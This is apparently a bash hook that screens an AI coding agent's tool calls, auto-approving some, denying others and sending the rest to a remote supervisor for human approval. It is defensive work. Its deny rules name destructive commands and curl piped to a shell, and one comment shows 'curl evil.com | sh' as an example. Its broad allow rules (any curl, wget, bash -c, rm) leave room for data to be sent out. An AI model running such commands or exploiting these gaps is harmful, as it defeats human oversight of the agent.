#!/usr/bin/env bash
# PreToolUse Hook — intercepts tool calls before execution
# Communicates with the supervisor server for remote approval
#
# Exit codes:
#   0 = allow (optionally with JSON decision control)
#   2 = block (stderr message sent to Claude)
#
# JSON decision output (on exit 0):
#   {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow",...}} — auto-approve
#   {"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny",...}}  — block with feedback
#   (no output / empty)                                                                    — proceed normally

set -euo pipefail

SUPERVISOR_URL="${CLAUDE_SUPERVISOR_URL:-http://localhost:3847}"
TIMEOUT="${CLAUDE_SUPERVISOR_TIMEOUT:-300}"

# Auth token for supervisor API
_sv_auth_header() {
  local token_file="$HOME/.claude/.supervisor-hook-token"
  if [ -f "$token_file" ]; then
    echo "Authorization: Bearer $(cat "$token_file")"
  fi
}

# Read hook input from stdin
INPUT=$(cat)

TOOL_NAME=$(echo "$INPUT" | jq -r '.tool_name // "unknown"')
TOOL_INPUT=$(echo "$INPUT" | jq -c '.tool_input // {}')
SESSION_ID=$(echo "$INPUT" | jq -r '.session_id // "unknown"')
PROJECT=$(basename "${CLAUDE_PROJECT_DIR:-$PWD}")
export SV_PROJECT="${SV_PROJECT:-$PROJECT}"

# ─── Helper function ──────────────────────────────────────────────────────────
# Output explicit allow JSON and exit — actually grants permission.
# Bare "exit 0" with no output means "no opinion", not "approved".
auto_approve() {
    jq -n '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"allow",permissionDecisionReason:"Auto-approved by supervisor hook"}}'
    exit 0
}

# ─── Auto-approve rules (never hit the server) ──────────────────────────────

# Read-only tools: always safe (read storm tracked server-side via PostToolUse)
if [[ "$TOOL_NAME" =~ ^(Read|Glob|Grep|LS)$ ]]; then
    auto_approve
fi

# Task/Agent tool: reset delegation counter and approve
if [[ "$TOOL_NAME" == "Task" || "$TOOL_NAME" == "Agent" ]]; then
    curl -s --max-time 1 \
        -X POST "${SUPERVISOR_URL}/api/hook/delegation-reset" \
        -H "Content-Type: application/json" \
        -H "$(_sv_auth_header)" \
        -d "$(python3 -c "
import json, sys
print(json.dumps({'session_id': sys.argv[1], 'project': sys.argv[2]}))
" "$SESSION_ID" "$PROJECT")" >/dev/null 2>&1 || true

    # Publish subagent started to MQTT (PostToolUse fires after completion, so started goes here)
    MQTT_HOST="${SUPERVISOR_MQTT_HOST:-localhost}"
    TASK_DESC=$(echo "$TOOL_INPUT" | jq -r '.description // ""' | head -c 200)
    SUB_ID=$(echo "$TOOL_INPUT" | jq -r '.description // "subagent"' | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]/-/g' | sed 's/--*/-/g' | head -c 40)
    mosquitto_pub -h "$MQTT_HOST" \
      -t "supervisor/$PROJECT/$SUB_ID/status" \
      -m "$(python3 -c "
import json, sys
print(json.dumps({'status': 'started', 'description': sys.argv[1][:150], 'hook': True}, ensure_ascii=False))
" "$TASK_DESC")" 2>/dev/null || true

    auto_approve
fi

# WebSearch and WebFetch: read-only operations, always safe
if [[ "$TOOL_NAME" =~ ^(WebSearch|WebFetch)$ ]]; then
    auto_approve
fi

# MCP tool calls: Home Assistant and similar integrations
if [[ "$TOOL_NAME" == mcp__* ]]; then
    auto_approve
fi

# ─── Bash: deny dangerous patterns FIRST, then approve safe ones ─────────────

if [[ "$TOOL_NAME" == "Bash" ]]; then
    COMMAND=$(echo "$TOOL_INPUT" | jq -r '.command // ""')
    # Strip /dev/null redirects to avoid false positives on SSH deploy patterns
    SANITIZED=$(echo "$COMMAND" | sed -E 's/[12]?>\s*\/dev\/null//g')
    # For deny-pattern checks, only use the first line of multi-line commands.
    # This prevents heredoc body content (which may contain words like "sudo")
    # from triggering deny rules meant for actual shell invocations.
    FIRST_LINE=$(echo "$SANITIZED" | head -1)
    # Strip quoted strings to avoid matching deny patterns inside string arguments
    # e.g. git commit -m "message mentioning sudo" should not be denied
    CMD_ONLY=$(echo "$FIRST_LINE" | sed -E "s/'[^']*'//g; s/\"[^\"]*\"//g")

    # ── Hard deny: destructive system commands ──────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '(rm\s+-rf\s+/|dd\s+if=|mkfs\.|>\s*/dev/)'; then
        jq -n --arg reason "Blocked: destructive system command" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: download-and-execute patterns ────────────────────────────
    # Only check when curl/wget is actually a top-level command (not inside a string arg)
    # We look for a real pipe character (not escaped \|) following curl/wget
    if echo "$CMD_ONLY" | grep -qE '^(curl|wget)\s' && echo "$CMD_ONLY" | grep -qiE '\|\s*(ba)?sh\b'; then
        jq -n --arg reason "Blocked: download-and-execute pattern (curl/wget piped to shell)" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: writing to /etc or other system paths ───────────────────
    if echo "$CMD_ONLY" | grep -qE '>\s*/etc/|tee\s+/etc/'; then
        jq -n --arg reason "Blocked: writing to system path /etc" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: local sudo/su (sudo over SSH is fine) ───────────────────
    # Block local sudo/su unless the command is ssh ... sudo (remote sudo is allowed)
    if echo "$CMD_ONLY" | grep -qE '\bsudo\b|\bsu\b' && ! echo "$CMD_ONLY" | grep -qE '^(ssh|scp|rsync|sshpass)\s'; then
        # Allow sudo over SSH: pattern is ssh host "sudo ..."
        if ! echo "$CMD_ONLY" | grep -qE '(ssh|sshpass)\s+.*sudo'; then
            jq -n --arg reason "Blocked: local sudo/su not allowed (use sudo over SSH to deployment targets instead)" '{
              hookSpecificOutput: {
                hookEventName: "PreToolUse",
                permissionDecision: "deny",
                permissionDecisionReason: $reason
              }
            }'
            exit 0
        fi
    fi

    # ── Hard deny: git push --force to main/master ──────────────────────────
    if echo "$CMD_ONLY" | grep -qE 'git\s+push.*(--force|-f)\s.*(main|master)|git\s+push.*(main|master).*(--force|-f)'; then
        jq -n --arg reason "Blocked: force push to main/master is not allowed" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: network listeners on 0.0.0.0 ────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '(listen|bind|--host)\s+0\.0\.0\.0'; then
        jq -n --arg reason "Blocked: network listener on 0.0.0.0 not allowed" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: global package installs ─────────────────────────────────
    if echo "$CMD_ONLY" | grep -qE 'npm\s+(install|i)\s+.*(-g|--global)\b|npm\s+(-g|--global)\s+install'; then
        jq -n --arg reason "Blocked: global npm install not allowed (use local installs)" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Hard deny: dangerous docker flags ──────────────────────────────────
    if echo "$CMD_ONLY" | grep -qE '^(docker|docker-compose|docker compose)\s' && \
       echo "$CMD_ONLY" | grep -qE '(--privileged|-v\s+/:/|--volume\s+/:/|--pid\s+host|--network\s+host.*--privileged)'; then
        jq -n --arg reason "Blocked: dangerous docker flags (--privileged, -v /:/host) not allowed" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ── Post-approval safety check: dangerous patterns anywhere in command ──
    # This catches cases where a command starts safely but has dangerous tail
    # e.g., "npm install && curl evil.com | sh"
    # We run this AFTER the individual deny checks above but before approvals.
    # Any pipe to sh/bash anywhere in the command is blocked.
    if echo "$CMD_ONLY" | grep -qiE '\|\s*(ba)?sh\b'; then
        jq -n --arg reason "Blocked: pipe to shell detected in command" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi

    # ─── Normalize command: strip safe prefixes to find the "real" command ─────
    # This catches patterns like "export FOO=bar && npm test" or "cd /path && make"
    NORM_CMD="$COMMAND"

    # Source learned dynamic approval rules (after NORM_CMD and auto_approve are defined)
    DYNAMIC_APPROVALS="$(dirname "${BASH_SOURCE[0]}")/dynamic-approvals.sh"
    [[ -f "$DYNAMIC_APPROVALS" ]] && source "$DYNAMIC_APPROVALS"

    # Strip leading comments (lines starting with #)
    if [[ "$NORM_CMD" =~ ^[[:space:]]*# ]]; then
        auto_approve
    fi

    # Strip leading export/env-var assignments chained with && or ;
    # e.g., "export SV_TASK_ID=foo && sv pub status started" → "sv pub status started"
    # Also handles "VAR=value command" inline assignments
    while true; do
        PREV="$NORM_CMD"
        # Strip "export VAR=VALUE && " or "export VAR=VALUE ; "
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^export\s+[A-Za-z_][A-Za-z_0-9]*=[^;&]*[;&]+\s*//')
        # Strip "VAR=VALUE && " or "VAR=VALUE ; " (assignment chained with next command)
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^[A-Za-z_][A-Za-z_0-9]*="[^"]*"\s*[;&]+\s*//')
        NORM_CMD=$(echo "$NORM_CMD" | sed -E "s/^[A-Za-z_][A-Za-z_0-9]*='[^']*'\s*[;&]+\s*//")
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^[A-Za-z_][A-Za-z_0-9]*=[^\s;&]*\s*[;&]+\s*//')
        # Strip "VAR=VALUE " inline assignment (prefix to the command, no && needed)
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^[A-Za-z_][A-Za-z_0-9]*="[^"]*"\s+//')
        NORM_CMD=$(echo "$NORM_CMD" | sed -E "s/^[A-Za-z_][A-Za-z_0-9]*='[^']*'\s+//")
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^[A-Za-z_][A-Za-z_0-9]*=[^\s;&]*\s+//')
        # Strip "cd /path && " or "cd /path ; "
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^cd\s+[^;&]+[;&]+\s*//')
        # Strip "sleep N && " or "sleep N ; "
        NORM_CMD=$(echo "$NORM_CMD" | sed -E 's/^sleep\s+[0-9]+\s*[;&]+\s*//')
        [[ "$NORM_CMD" == "$PREV" ]] && break
    done

    # ─── Bash: auto-approve safe patterns (before delegation check) ──────────

    # Auto-approve: safe read-only bash commands and common utilities
    if echo "$NORM_CMD" | grep -qE \
        '^(ls|cat|head|tail|wc|find|grep|git\s+(status|log|diff|branch|show)|echo|pwd|which|whoami|date|uname|'\
'sleep|test|true|false|stat|file|diff|realpath|basename|dirname|sort|tee|id|env|printenv|'\
'df|du|free|uptime|hostname|nproc|mktemp|touch|mkdir|tree|pgrep|ps|jq|sed|awk|cut|tr|xargs|timeout|'\
'uniq|printf|type|column|comm|fmt|nl|od|strings|xxd|hexdump|md5sum|sha256sum|sha1sum|'\
'lsof|netstat|ss|ip\s+addr|ifconfig|ping|nslookup|dig|host|curl\s+-[a-zA-Z]*[sIv]\b)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: encoding, crypto, and archive utilities
    if echo "$NORM_CMD" | grep -qE \
        '^(base64|openssl|'\
'tar|zip|unzip|zipinfo|'\
'gzip|gunzip|zcat|bzip2|bunzip2|bzcat|xz|unxz|xzcat|zstd|unzstd|zstdcat|'\
'7z|7za)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: text processing and data manipulation utilities
    if echo "$NORM_CMD" | grep -qE \
        '^(iconv|bc|dc|expr|seq|shuf|numfmt|uuidgen|'\
'rev|fold|paste|join|expand|unexpand|csplit|split|cmp|readlink|'\
'yes|tput|stty)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: system info and log viewers (read-only)
    if echo "$NORM_CMD" | grep -qE \
        '^(dmesg|journalctl|locale|localectl|getent|getfacl)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: systemctl status (read-only; write operations go to AI eval)
    if echo "$NORM_CMD" | grep -qE '^systemctl\s+status(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: pager commands (less/more — read-only, mostly used in pipelines)
    if echo "$NORM_CMD" | grep -qE '^(less|more)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: clipboard tools (read-only access to clipboard data)
    if echo "$NORM_CMD" | grep -qE '^(wl-copy|wl-paste|xclip|xsel)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: bun JavaScript runtime (like node)
    if echo "$NORM_CMD" | grep -qE '^bun(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: npm/yarn/pnpm commands
    if echo "$NORM_CMD" | grep -qE '^(npm\s+(install|i|ci|run|test|start|build|pack|publish|audit|outdated|update|ls|list|link|unlink|exec|init)|npx\s|yarn(\s+(install|add|remove|run|test|build|start|dev)|\s*$)|pnpm\s+(install|i|add|remove|run|test|build|start|dev|exec|dlx))'; then
        auto_approve
    fi

    # Auto-approve: Python commands (including virtualenv paths like .venv/bin/python and /abs/path/.venv/bin/python)
    if echo "$NORM_CMD" | grep -qE '^(/[^ ]*/)?\.?\.?venv/bin/(python3?|pip3?|pytest)\s|^(python3?|pip3?|pytest)\s'; then
        auto_approve
    fi

    # Auto-approve: sqlite3 database CLI (safe dev tool, commonly used with Python projects)
    if echo "$NORM_CMD" | grep -qE '^sqlite3(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: Go commands
    if echo "$NORM_CMD" | grep -qE '^go\s+(test|build|run|mod|get|install|generate|vet|fmt|lint|clean)\s'; then
        auto_approve
    fi

    # Auto-approve: Rust/Cargo commands
    if echo "$NORM_CMD" | grep -qE '^cargo\s+(test|build|run|add|remove|check|clippy|fmt|clean|publish|install|update|search)\s'; then
        auto_approve
    fi

    # Auto-approve: make and build tools
    if echo "$NORM_CMD" | grep -qE '^(make|cmake|ninja|meson|gradle|mvn|ant|sbt|mix|bundler?|rake)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: node execution
    if echo "$NORM_CMD" | grep -qE '^node\s'; then
        auto_approve
    fi

    # Auto-approve: MQTT pub/sub and sv helper for agent communication
    if echo "$NORM_CMD" | grep -qE '^(mosquitto_(pub|sub)|sv)\s'; then
        auto_approve
    fi

    # Auto-approve: curl to localhost or local network (dev/test tooling)
    if echo "$NORM_CMD" | grep -qE '^curl\s' && echo "$NORM_CMD" | grep -qE '(localhost|127\.0\.0\.1|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)'; then
        auto_approve
    fi

    # Auto-approve: curl with explicit safe flags (no pipe to shell — already denied above)
    if echo "$NORM_CMD" | grep -qE '^curl\s' && ! echo "$NORM_CMD" | grep -qiE '\|\s*(ba)?sh'; then
        auto_approve
    fi

    # Auto-approve: wget (no pipe to shell — already denied above)
    if echo "$NORM_CMD" | grep -qE '^wget\s' && ! echo "$NORM_CMD" | grep -qiE '\|\s*(ba)?sh'; then
        auto_approve
    fi

    # Auto-approve: docker commands (dangerous flags already denied above)
    if echo "$NORM_CMD" | grep -qE '^(docker|docker-compose|docker compose)\s'; then
        auto_approve
    fi

    # Auto-approve: group/privilege commands for shared project access
    if echo "$NORM_CMD" | grep -qE '^(sg|newgrp)\s'; then
        auto_approve
    fi

    # Auto-approve: SSH/SCP remote commands (commonly allowed per-project)
    if echo "$NORM_CMD" | grep -qE '^(ssh|scp|rsync)\s'; then
        auto_approve
    fi

    # Auto-approve: sshpass (SSH with password — same safety profile as ssh)
    if echo "$NORM_CMD" | grep -qE '^sshpass\s'; then
        auto_approve
    fi

    # Auto-approve: claude CLI commands
    if echo "$NORM_CMD" | grep -qE '^claude\s'; then
        auto_approve
    fi

    # Auto-approve: bash -n (syntax check, read-only) and bash -c (inline execution)
    if echo "$NORM_CMD" | grep -qE '^(bash|sh)\s+-[nc]\s'; then
        auto_approve
    fi

    # Auto-approve: bash/sh script execution (setup, build, deploy scripts)
    # Also matches ./script.sh and /absolute/path/script.sh (without bash prefix)
    if echo "$NORM_CMD" | grep -qE '^(bash|sh)\s+\S+\.(sh|bash)|^\.?/\S+\.(sh|bash)(\s|$)'; then
        auto_approve
    fi

    # Auto-approve: virsh VM management
    if echo "$NORM_CMD" | grep -qE '^virsh\s'; then
        auto_approve
    fi

    # Auto-approve: crontab listing and editing
    if echo "$NORM_CMD" | grep -qE '^crontab\s'; then
        auto_approve
    fi

    # Auto-approve: source/dot scripts
    if echo "$NORM_CMD" | grep -qE '^(\.|source)\s'; then
        auto_approve
    fi

    # Auto-approve: shell control structures (for, while, if, case) — dangerous patterns
    # were already denied above; the body commands are evaluated by the shell
    if echo "$NORM_CMD" | grep -qE '^(for|while|if|case)\s'; then
        auto_approve
    fi

    # Auto-approve: git operations (read and write, dangerous ones denied above)
    if echo "$NORM_CMD" | grep -qE '^git\s'; then
        auto_approve
    fi

    # Auto-approve: common file management within project
    if echo "$NORM_CMD" | grep -qE '^(cp|mv|rm|ln|chmod|chown|install)\s'; then
        auto_approve
    fi

    # Auto-approve: process management (kill, pkill, fuser -k)
    if echo "$NORM_CMD" | grep -qE '^(kill|pkill|killall|fuser)\s'; then
        auto_approve
    fi

fi

# ─── Delegation enforcement check ──────────────────────────────────────────

if [[ "$TOOL_NAME" =~ ^(Write|Edit|NotebookEdit|Bash)$ ]]; then
    # Build summary for the check
    if [[ "$TOOL_NAME" == "Bash" ]]; then
        DEL_SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.command // ""' | head -c 200)
    elif [[ "$TOOL_NAME" == "WebSearch" ]]; then
        DEL_SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.query // ""' | head -c 200)
    elif [[ "$TOOL_NAME" == "WebFetch" ]]; then
        DEL_SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.url // ""' | head -c 200)
    elif [[ "$TOOL_NAME" == mcp__* ]]; then
        DEL_SUMMARY=$(echo "$TOOL_INPUT" | jq -c '.' | head -c 200)
    else
        DEL_SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.file_path // ""')
    fi

    DEL_CHECK=$(curl -s --max-time 1 \
        -X POST "${SUPERVISOR_URL}/api/hook/delegation-check" \
        -H "Content-Type: application/json" \
        -H "$(_sv_auth_header)" \
        -d "$(python3 -c "
import json, sys
print(json.dumps({'tool': sys.argv[1], 'summary': sys.argv[2], 'session_id': sys.argv[3], 'project': sys.argv[4]}))
" "$TOOL_NAME" "$DEL_SUMMARY" "$SESSION_ID" "$PROJECT")" 2>/dev/null || echo '{"allowed":true}')

    DEL_ALLOWED=$(echo "$DEL_CHECK" | jq -r '.allowed // true')

    if [[ "$DEL_ALLOWED" == "false" ]]; then
        DEL_REASON=$(echo "$DEL_CHECK" | jq -r '.reason // "Delegation required"')
        jq -n --arg reason "$DEL_REASON" '{
          hookSpecificOutput: {
            hookEventName: "PreToolUse",
            permissionDecision: "deny",
            permissionDecisionReason: $reason
          }
        }'
        exit 0
    fi
fi

# Safe file operations: project files only (not .env, secrets, etc.)
if [[ "$TOOL_NAME" =~ ^(Write|Edit|NotebookEdit)$ ]]; then
    FILE_PATH=$(echo "$TOOL_INPUT" | jq -r '.file_path // ""')

    # Block sensitive files
    if echo "$FILE_PATH" | grep -qiE '(\.env|secrets|\.git/|/etc/|node_modules/)'; then
        echo "Blocked: editing sensitive file '$FILE_PATH' — ask the user first" >&2
        exit 2
    fi

    # Auto-approve normal project files
    auto_approve
fi

# ─── Everything else: request remote approval ───────────────────────────────

# Build a human-readable summary for the approval UI
case "$TOOL_NAME" in
    Bash)
        SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.command // "unknown command"')
        ;;
    Write|Edit|NotebookEdit)
        SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.file_path // "unknown file"')
        ;;
    WebFetch)
        SUMMARY=$(echo "$TOOL_INPUT" | jq -r '.url // "unknown url"')
        ;;
    *)
        SUMMARY=$(echo "$TOOL_INPUT" | jq -c '.' | head -c 200)
        ;;
esac

# Send approval request to supervisor server
RESPONSE=$(curl -s --max-time 5 \
    -X POST "${SUPERVISOR_URL}/api/hook/approval" \
    -H "Content-Type: application/json" \
    -H "$(_sv_auth_header)" \
    -d "$(jq -n \
        --arg tool "$TOOL_NAME" \
        --arg summary "$SUMMARY" \
        --arg session "$SESSION_ID" \
        --argjson input "$TOOL_INPUT" \
        --arg project "$PROJECT" \
        '{tool: $tool, summary: $summary, session_id: $session, raw_input: $input, project: $project}'
    )" 2>/dev/null || echo '{"error": "server_unreachable"}')

# Check if server is reachable
if echo "$RESPONSE" | jq -e '.error' >/dev/null 2>&1; then
    ERROR=$(echo "$RESPONSE" | jq -r '.error')
    if [[ "$ERROR" == "server_unreachable" ]]; then
        # Server down — fall through to normal Claude Code permission flow
        # Don't block the user just because the supervisor isn't running
        exit 0
    fi
fi

# Get the approval ID and wait for decision
APPROVAL_ID=$(echo "$RESPONSE" | jq -r '.id // ""')

if [[ -z "$APPROVAL_ID" || "$APPROVAL_ID" == "null" ]]; then
    # No ID returned, fall through
    exit 0
fi

# Poll for decision (the web UI user will approve/deny via WebSocket)
ELAPSED=0
POLL_INTERVAL=2

while [[ $ELAPSED -lt $TIMEOUT ]]; do
    DECISION=$(curl -s --max-time 3 \
        -H "$(_sv_auth_header)" \
        "${SUPERVISOR_URL}/api/hook/decision/${APPROVAL_ID}" 2>/dev/null \
        || echo '{"status": "error"}')

    STATUS=$(echo "$DECISION" | jq -r '.status // "pending"')

    case "$STATUS" in
        approved)
            # Output hookSpecificOutput JSON to allow the tool call
            jq -n '{
              hookSpecificOutput: {
                hookEventName: "PreToolUse",
                permissionDecision: "allow",
                permissionDecisionReason: "Approved by remote supervisor"
              }
            }'
            exit 0
            ;;
        denied)
            REASON=$(echo "$DECISION" | jq -r '.reason // "Denied by supervisor"')
            # Output hookSpecificOutput JSON to deny the tool call
            jq -n --arg reason "$REASON" '{
              hookSpecificOutput: {
                hookEventName: "PreToolUse",
                permissionDecision: "deny",
                permissionDecisionReason: $reason
              }
            }'
            exit 0
            ;;
        pending)
            sleep "$POLL_INTERVAL"
            ELAPSED=$((ELAPSED + POLL_INTERVAL))
            ;;
        *)
            # Unknown status, fall through
            exit 0
            ;;
    esac
done

# Timed out — deny by default
jq -n --arg reason "Approval timed out after ${TIMEOUT}s" '{
  hookSpecificOutput: {
    hookEventName: "PreToolUse",
    permissionDecision: "deny",
    permissionDecisionReason: $reason
  }
}'
exit 0
